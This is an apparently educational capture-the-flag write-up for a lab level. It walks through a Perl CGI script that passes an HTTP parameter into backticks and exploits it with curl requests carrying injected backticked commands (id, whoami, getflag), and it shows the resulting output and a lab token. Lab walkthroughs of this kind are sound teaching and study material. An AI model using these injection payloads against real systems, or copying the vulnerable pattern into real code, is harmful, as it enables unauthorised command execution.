## Level 04: Exploiting the Perl Script Vulnerability

### Goal
Identify and exploit a command injection vulnerability in a Perl CGI script (`level04.pl`) to retrieve the token.

### Understanding the Perl Script

1. **What is `level04.pl`?**  
- It is a Perl source file, commonly used for tasks like text manipulation, system automation, or web development.  
- This script functions as a `CGI` script, handling HTTP requests and dynamically generating web responses.

2. **How does the script work?**  
   Executing the file (`./level04.pl`) produces:
   ```html
   Content-type: text/html
   ```
   Inspecting the file (`cat level04.pl`) reveals:
   ```perl
   #!/usr/bin/perl
   # localhost:4747
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
   }
   x(param("x"));
   ```
   Key points:
   - `use CGI qw{param}`: Imports a `CGI` module and the `param` function from this module to handle HTTP parameters.
   - `$y = $_[0]`: assign the first argument passed to the subroutine to the variable `$y`
   - The `x` function print the result of executed command: `echo $y`.  
   Using backticks allows arbitrary command execution.
   - `x(param("x"))`: `param()` retrieves the parameter `x` from the HTTP request and passes its value to the `x` function.

3. **Vulnerability Analysis**  
   - The parameter `x` is passed directly to a shell command without validation.
   - This opens a command injection vulnerability, allowing arbitrary commands to be executed.

### Explanation of the Exploitation
1. **Command Injection via curl**  
   We can send HTTP requests to the script with malicious payloads to execute arbitrary commands:
   ```bash
   curl http://localhost:4747/level04.pl?x="\`/usr/bin/id\`"
   ```
   Output:
   ```scss
   uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)
   ```
   Similarly, using the whoami command:
   ```bash
   curl http://localhost:4747/level04.pl?x="\`/usr/bin/whoami\`"
   ```
   Output:
   ```bash
   flag04
   ```
   **Why the commands are executed and not just `echo` in the Shell ?**  
   - Backticks (``) in `Perl` execute the command inside them in a subshell and return the output
   - The value of `$y` is interpolated into the `echo $y` command in the script.  

   For exemple, with this request:
   ```bash
   curl http://localhost:4747/level04.pl?x="\`/usr/bin/whoami\`"
   ```
   The executed Perl script becomes:
   ```perl
   #!/usr/bin/perl
   # localhost:4747
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub x {
      $y = $_[0]; # $y becomes "`/usr/bin/whoami`"
      print `echo $y 2>&1`; # Executes: echo `/usr/bin/whoami` 2>&1 and print the result of the echo command
   }
   x(param("x")); #  param("x") returns "\`/usr/bin/whoami\`"
   ```

2. **Retrieve the Token**  
   Since the script runs as the `flag04` user, we can directly execute the `getflag` command:
   ```bash
   curl http://localhost:4747/level04.pl?x="\`/bin/getflag\`"
   ```
   Output:
   ```bash
   Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
   ```

